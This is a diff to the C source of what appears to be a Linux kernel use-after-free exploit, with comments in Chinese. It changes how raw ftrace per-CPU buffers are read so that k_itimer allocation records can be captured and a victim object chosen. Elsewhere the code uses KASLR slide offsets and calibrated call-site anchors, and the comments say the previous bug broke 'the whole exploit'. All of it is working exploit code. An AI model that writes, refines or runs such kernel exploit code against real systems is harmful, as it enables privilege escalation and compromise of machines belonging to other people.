@@ -22,6 +22,7 @@
 #include <sys/socket.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
+#include <sys/time.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -710,33 +711,37 @@ static int read_raw(uint8_t *buf, size_t cap, size_t *used)
 
 /*
  * ------------------------------------------------------------------
- * 多 CPU raw 采集（增量扫描 k_itimer 记录）
+ * raw trace 采集（增量扫描 k_itimer 记录）
  *
- * 为什么不再「只读 cpu0 + alarm(2) 阻塞等满 2 秒」：
+ * ⚠️ trace_pipe_raw **不支持 poll()** —— 它的等待队列只在阻塞 read() 的
+ * 路径里注册，poll() 永远等不到可读信号。v1.1.9 用 poll() 决定何时
+ * read()，结果真机 2026-10-31 18:24 那轮每个 cycle 都是
+ *   [uaf] captured=0 chosen=0 raw=0
+ * 一个字节都读不到，整条 exploit 挂掉。
+ * （calib.c 的 capture_raw 之所以要 fork 子进程做阻塞读、再用普通管道
+ *   转发给父进程 poll，正是因为这个限制。）
+ * 所以这里老老实实用**阻塞读 + 超时打断**：read() 返回 EINTR 就说明
+ * 环形缓冲排空了。
  *
- *  1) 旧实现是**死等**。collect_nth() 在 tracing_on=0 之后才去读 raw pipe，
- *     此刻环形缓冲已经冻结、不会再有新记录 —— 那 2 秒（alarm 兜底）全部花在
- *     阻塞的 read() 上。真机 2026-10-31 17:42 那轮日志里每个 uaf cycle
- *     ~2.9 秒，其中 ~2.0 秒就是这段死等；一轮 4 个 cycle 白扔 8 秒。
+ * 超时从「alarm(2)」改成 setitimer 的毫秒级：
+ *   - 首次读给 2000ms 宽限（老实现 alarm(2) 就是这个量级，行为一致）；
+ *   - 之后的每次读只等 400ms —— 采集前 tracing_on 已关，缓冲里的数据
+ *     是冻结的，400ms 内没有新数据就等于排空了。老实现每次都要白等满
+ *     2 秒，真机日志里每个 uaf cycle 的 ~2.9 秒有 ~2.0 秒耗在这。
  *
- *  2) 只读 cpu0 还有个更隐蔽的坑：造 timer 的子进程**不绑核**，它的分配记录
- *     可能落在任意 CPU 上，cpu0 上有时一条都捞不到（[uaf] too few timers）。
- *     calib.c 早就为此改成多 CPU 采集（见 calib.c 的 capture_raw），这里跟上。
- *
- * 语义保持（重要）：
- *   - 仍然按「trace 记录出现顺序」取第 index 条当 victim；
- *   - **先读完 cpu0 再考虑其它 CPU**，所以 cpu0 记录够用时 g_all[] 的内容与
- *     顺序跟旧实现完全一致 → victim 也完全一致，不改变现有跑通路径的概率；
- *   - cpu0 不够（index 拿不到）时才去补其它 CPU —— 只增不减。
+ * 多 CPU：造 timer 的子进程**不绑核**，它的分配记录可能落在任意 CPU
+ * 上；只读 cpu0 时有时一条都捞不到（[uaf] too few timers）。所以 cpu0
+ * 不够时再去补其它 CPU —— 这条分支只在 cpu0 不足时才会走（老实现在这里
+ * 直接失败），只会把「失败」变成「成功」，不改变原来跑通的路径。
  * ------------------------------------------------------------------
  */
 #define UAF_RAW_IDLE_MS 400
-#define UAF_RAW_DEADLINE_MS 2000
+#define UAF_RAW_FIRST_MS 2000
+#define UAF_RAW_FALLBACK_MS 1000
 #define UAF_RAW_MAXCPU 16
 #define UAF_RAW_CHUNK 16384
 
-/* 读缓冲：raw_scan_feed() 会把 tail 拼到数据前面 memcpy，扫描工作区在
- * rawscan_state 内部，所以读缓冲与扫描缓冲必须分开（否则是自拷贝）。 */
+/* 读缓冲；扫描工作区在 rawscan_state 内部，两者必须分开（否则是自拷贝）。 */
 static uint8_t g_raw_read_buf[UAF_RAW_CHUNK];
 
 static uint64_t now_ms_uaf(void)
@@ -746,83 +751,65 @@ static uint64_t now_ms_uaf(void)
 	return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
 }
 
-/*
- * 读一组 raw pipe，直到每个 CPU 都安静满 UAF_RAW_IDLE_MS，或到达硬截止。
- *
- * 空闲早停：采集前 tracing_on 已关，缓冲里的数据是冻结的，排空即结束。
- * 某个 CPU 一直安静 → 它就是空的（不会再有新数据），等下去没意义。
- */
-static void raw_drain(int *fds, int nfds, struct rawscan_state *s, uint64_t deadline)
+/* setitimer 毫秒级超时；handler 是空函数（on_alarm），只为了打断阻塞读。 */
+static void arm_raw_timer(unsigned ms)
 {
-	struct pollfd pfds[UAF_RAW_MAXCPU];
-	uint64_t last_ms[UAF_RAW_MAXCPU];
-	int alive = nfds;
-	int i;
+	struct itimerval it;
+	memset(&it, 0, sizeof(it));
+	it.it_value.tv_sec = (time_t)(ms / 1000);
+	it.it_value.tv_usec = (suseconds_t)((ms % 1000) * 1000);
+	setitimer(ITIMER_REAL, &it, NULL);
+}
 
-	for (i = 0; i < nfds; i++)
-		last_ms[i] = now_ms_uaf();
+static void disarm_raw_timer(void)
+{
+	struct itimerval it;
+	memset(&it, 0, sizeof(it));
+	setitimer(ITIMER_REAL, &it, NULL);
+}
 
-	while (alive > 0) {
+/*
+ * 读某个 CPU 的 raw pipe 直到超时（缓冲排空）。
+ * deadline 是这次采集的总预算上限，first_ms 是首次读的宽限。
+ */
+static int drain_cpu_raw(int cpu, struct rawscan_state *s,
+			 uint64_t deadline, unsigned first_ms)
+{
+	char path[96];
+	int fd, first = 1, got_any = 0;
+	ssize_t got;
+
+	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+	fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return -1;
+	for (;;) {
 		uint64_t now = now_ms_uaf();
-		int ready;
-
+		unsigned budget;
 		if (now >= deadline)
 			break;
-		/* 逐个 CPU 判空闲 */
-		for (i = 0; i < nfds; i++) {
-			if (fds[i] < 0)
-				continue;
-			if (now - last_ms[i] >= (uint64_t)UAF_RAW_IDLE_MS) {
-				close(fds[i]);
-				fds[i] = -1;
-				alive--;
-			}
-		}
-		if (alive <= 0)
-			break;
-		for (i = 0; i < nfds; i++) {
-			pfds[i].fd = fds[i];
-			pfds[i].events = POLLIN;
-			pfds[i].revents = 0;
-		}
-		ready = poll(pfds, (nfds_t)nfds, 100);
-		if (ready < 0) {
-			if (errno == EINTR)
-				continue;
-			break;
-		}
-		if (ready == 0)
-			continue;
-		for (i = 0; i < nfds; i++) {
-			ssize_t got;
-			if (fds[i] < 0 || !(pfds[i].revents & POLLIN))
-				continue;
-			got = read(fds[i], g_raw_read_buf, UAF_RAW_CHUNK);
-			if (got <= 0) {
-				if (got < 0 && (errno == EINTR || errno == EAGAIN))
-					continue;
-				close(fds[i]);
-				fds[i] = -1;
-				alive--;
-				continue;
-			}
-			rawscan_feed(s, g_raw_read_buf, (size_t)got);
-			last_ms[i] = now_ms_uaf();
-		}
+		budget = first ? first_ms : UAF_RAW_IDLE_MS;
+		if (deadline - now < (uint64_t)budget)
+			budget = (unsigned)(deadline - now);
+		if (budget < 10)
+			budget = 10;
+		arm_raw_timer(budget);
+		got = read(fd, g_raw_read_buf, UAF_RAW_CHUNK);
+		disarm_raw_timer();
+		if (got <= 0)
+			break;		/* EINTR（超时）= 排空了 */
+		first = 0;
+		got_any = 1;
+		rawscan_feed(s, g_raw_read_buf, (size_t)got);
 	}
-	for (i = 0; i < nfds; i++) {
-		if (fds[i] >= 0) {
-			close(fds[i]);
-			fds[i] = -1;
-		}
-	}
+	close(fd);
+	return got_any ? 0 : -1;
 }
 
 static int collect_nth(int index, int *count, uint64_t *chosen)
 {
 	static struct rawscan_state s;
-	int fds[UAF_RAW_MAXCPU];
-	int nfds, i;
+	int ncpu, cpu;
 	/* 匹配键：运行期实测调用点 > 写死锚点（仅 6.6 可信） > 只按 req 匹配 */
 	uint64_t site = SITE_KITIMER_RT ? SITE_KITIMER_RT : slide_addr(TIMER_LINK);
 	int filter_by_site = (SITE_KITIMER_RT != 0) || STATIC_ANCHOR_TRUSTED;
@@ -833,32 +820,17 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	*chosen = 0;
 
 	/* --- 阶段 A：cpu0 优先（候选顺序与旧实现一致）--- */
-	fds[0] = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
-	if (fds[0] < 0)
-		return -1;
-	deadline = now_ms_uaf() + UAF_RAW_DEADLINE_MS;
-	raw_drain(fds, 1, &s, deadline);
+	deadline = now_ms_uaf() + UAF_RAW_FIRST_MS;
+	drain_cpu_raw(0, &s, deadline, UAF_RAW_FIRST_MS);
 
-	/* --- 阶段 B：cpu0 不够时才补其它 CPU --- */
+	/* --- 阶段 B：cpu0 不够时才补其它 CPU（子进程不绑核，记录可能不在 cpu0）--- */
 	if (s.out_n <= index) {
-		int ncpu = cpu_count();
+		ncpu = cpu_count();
 		if (ncpu > UAF_RAW_MAXCPU)
 			ncpu = UAF_RAW_MAXCPU;
-		nfds = 0;
-		for (i = 1; i < ncpu; i++) {
-			char path[96];
-			int fd;
-			snprintf(path, sizeof(path),
-				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", i);
-			fd = open(path, O_RDONLY | O_CLOEXEC);
-			if (fd < 0)
-				continue;
-			fds[nfds++] = fd;
-		}
-		if (nfds) {
-			deadline = now_ms_uaf() + UAF_RAW_DEADLINE_MS;
-			raw_drain(fds, nfds, &s, deadline);
-		}
+		deadline = now_ms_uaf() + UAF_RAW_FALLBACK_MS;
+		for (cpu = 1; cpu < ncpu; cpu++)
+			drain_cpu_raw(cpu, &s, deadline, UAF_RAW_IDLE_MS);
 	}
 
 	*count = s.out_n;
